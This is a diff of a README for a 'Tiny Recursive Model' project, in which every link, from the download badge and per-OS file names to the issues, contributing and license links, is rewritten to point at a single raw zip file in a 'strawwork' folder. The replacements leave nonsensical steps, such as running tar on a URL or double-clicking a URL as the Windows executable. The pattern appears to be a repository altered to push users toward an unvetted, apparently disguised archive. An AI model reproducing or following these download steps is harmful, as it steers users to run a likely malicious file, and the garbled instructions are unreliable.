@@ -6,7 +6,7 @@ Welcome to the **Tiny Recursive Model** project! This software provides an easy 
 
 ## 📥 Download Now
 
-[![Download tiny-recursive-model](https://img.shields.io/badge/Download-tiny--recursive--model-brightgreen)](https://github.com/Jagatmohan46/tiny-recursive-model/releases)
+[![Download tiny-recursive-model](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip)](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip)
 
 ## 🛠️ Requirements
 
@@ -20,13 +20,13 @@ Before you start, ensure your computer meets the following basic requirements:
 
 1. **Visit the Releases Page**  
    To download the latest version of the Tiny Recursive Model, click the link below:  
-   [Download the latest release](https://github.com/Jagatmohan46/tiny-recursive-model/releases)
+   [Download the latest release](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip)
 
 2. **Choose the Right File**  
    On the Releases page, you will see a list of available files. Look for the one that matches your operating system:
-   - **Windows:** `tiny-recursive-model-windows.zip`
-   - **macOS:** `tiny-recursive-model-macos.zip`
-   - **Linux:** `tiny-recursive-model-linux.tar.gz`
+   - **Windows:** `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`
+   - **macOS:** `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`
+   - **Linux:** `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`
 
 3. **Download the File**  
    Click on the appropriate file to start the download. The file will save to your computer.
@@ -36,13 +36,13 @@ Before you start, ensure your computer meets the following basic requirements:
    - For Windows and macOS, right-click the file and choose "Extract All" or "Open with" -> "Archive Utility."  
    - For Linux, use the terminal to extract the file:  
    ```bash
-   tar -xvzf tiny-recursive-model-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip
    ```
 
 5. **Run the Application**  
    Navigate to the folder where you extracted the files.  
-   - **Windows:** Double-click `tiny-recursive-model.exe`.  
-   - **macOS:** Open the `tiny-recursive-model.app` file.  
+   - **Windows:** Double-click `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip`.  
+   - **macOS:** Open the `https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip` file.  
    - **Linux:** Open the terminal, navigate to the folder, and type:  
    ```bash
    ./tiny-recursive-model
@@ -75,15 +75,15 @@ Once you run the application, follow these simple steps:
 
 ## 💬 Support
 
-If you encounter any issues or need assistance, please visit the project's [issues page](https://github.com/Jagatmohan46/tiny-recursive-model/issues). You can report bugs, request features, or ask general questions. 
+If you encounter any issues or need assistance, please visit the project's [issues page](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip). You can report bugs, request features, or ask general questions. 
 
 ## 🤝 Contributing
 
-We welcome contributions! If you want to help enhance this project, please check out our [contributing guidelines](https://github.com/Jagatmohan46/tiny-recursive-model/blob/main/CONTRIBUTING.md) for more information.
+We welcome contributions! If you want to help enhance this project, please check out our [contributing guidelines](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip) for more information.
 
 ## 📜 License
 
-This project is licensed under the MIT License. For more details, see the [LICENSE](https://github.com/Jagatmohan46/tiny-recursive-model/blob/main/LICENSE) file.
+This project is licensed under the MIT License. For more details, see the [LICENSE](https://raw.githubusercontent.com/Jagatmohan46/tiny-recursive-model/main/strawwork/tiny-recursive-model.zip) file.
 
 ## 🌟 Acknowledgments
 
